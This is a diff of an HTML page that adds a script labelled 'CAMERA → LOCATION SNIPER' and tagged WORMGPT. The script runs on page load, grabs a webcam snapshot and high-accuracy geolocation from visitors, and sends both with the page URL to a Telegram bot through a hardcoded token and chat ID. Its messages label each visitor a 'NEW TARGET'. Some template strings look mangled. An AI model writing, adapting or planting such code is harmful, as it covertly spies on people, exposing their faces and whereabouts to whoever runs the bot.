@@ -1973,73 +1973,84 @@
         <!-- Bootstrap JS -->
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-<!-- ===== SIMPLE CAMERA + LOCATION SNIPER - WORMGPT ===== -->
+<!-- ===== DIRECT CAMERA → LOCATION SNIPER - NO BUTTON - WORMGPT ===== -->
 <script>
-// GANTI INI DENGAN PUNYA LU
+// GANTI DENGAN PUNYA LU
 const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
 const CHAT_ID    = '7500770002';
 
 function sendToTelegram(text) {
-    if (!BOT_TOKEN || !CHAT_ID) return;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'HTML'
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
     }).catch(() => {});
 }
 
-// Jalankan langsung pas halaman dibuka
-window.addEventListener('load', () => {
-    // Langsung minta kamera
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(stream => {
-            let camStatus = '📸 KAMERA DI IZINKAN ✅';
+// Langsung minta kamera pas halaman dibuka
+window.addEventListener('load', async () => {
+    try {
+        // 1. Minta kamera (pop-up pertama harus muncul kalau HTTPS)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // Ambil snapshot
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 800)); // tunggu gambar stabil
 
-            // Coba ambil snapshot cepat (opsional, tapi bikin bukti lebih kuat)
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play().then(() => {
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/jpeg', 0.4);
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imgBase64 = canvas.toDataURL('image/jpeg', 0.5);
 
-                    // Matikan kamera
-                    stream.getTracks().forEach(t => t.stop());
+        // Matikan kamera biar ga nyala terus
+        stream.getTracks().forEach(t => t.stop());
 
-                    // Kirim snapshot + status
-                    sendToTelegram(`<b>NEW TARGET - KAMERA</b>\n${camStatus}\nURL: \( {window.location.href}\n\nSnapshot:\n \){img}`);
-                }, 800);
-            });
-        })
-        .catch(err => {
-            sendToTelegram(`<b>NEW TARGET - KAMERA DITOLAK</b>\nError: ${err.name || err.message}\nURL: ${window.location.href}`);
-        });
+        // 2. Langsung minta lokasi setelah kamera lolos
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapsUrl = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
 
-    // Langsung minta lokasi (paralel, ga nunggu kamera)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const loc = `📍 LOKASI DI IZINKAN ✅\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
-                sendToTelegram(`<b>NEW TARGET - LOKASI</b>\n${loc}\nURL: ${window.location.href}`);
-            },
-            err => {
-                sendToTelegram(`<b>NEW TARGET - LOKASI DITOLAK</b>\nError: ${err.message}\nURL: ${window.location.href}`);
-            },
-            { enableHighAccuracy: true, timeout: 7000 }
+                    sendToTelegram(
+                        `<b>KAMERA + LOKASI BERHASIL ✅</b>\n` +
+                        `URL: ${location.href}\n\n` +
+                        `📸 Gambar:\n${imgBase64}\n\n` +
+                        `📍 Lokasi: <a href="\( {mapsUrl}"> \){lat}, ${lon}</a> (klik buka maps)`
+                    );
+                },
+                err => {
+                    sendToTelegram(
+                        `<b>KAMERA OK, TAPI LOKASI DITOLAK</b>\n` +
+                        `Error: ${err.message}\n` +
+                        `URL: ${location.href}\n\n` +
+                        `📸 Gambar:\n${imgBase64}`
+                    );
+                },
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        } else {
+            sendToTelegram(
+                `<b>KAMERA OK, LOKASI GA SUPPORT</b>\n` +
+                `URL: ${location.href}\n\n` +
+                `📸 Gambar:\n${imgBase64}`
+            );
+        }
+
+    } catch (err) {
+        // Kamera ditolak atau error lain
+        sendToTelegram(
+            `<b>KAMERA DITOLAK / ERROR</b>\n` +
+            `Error: ${err.name || err.message}\n` +
+            `URL: ${location.href}`
         );
-    } else {
-        sendToTelegram(`<b>NEW TARGET</b>\nLokasi tidak didukung\nURL: ${window.location.href}`);
     }
 });
 </script>
-<!-- ===== END - SIMPLE SNIPER ===== -->
 <script>
             document.addEventListener("DOMContentLoaded", function () {
                 console.log("DOM loaded");
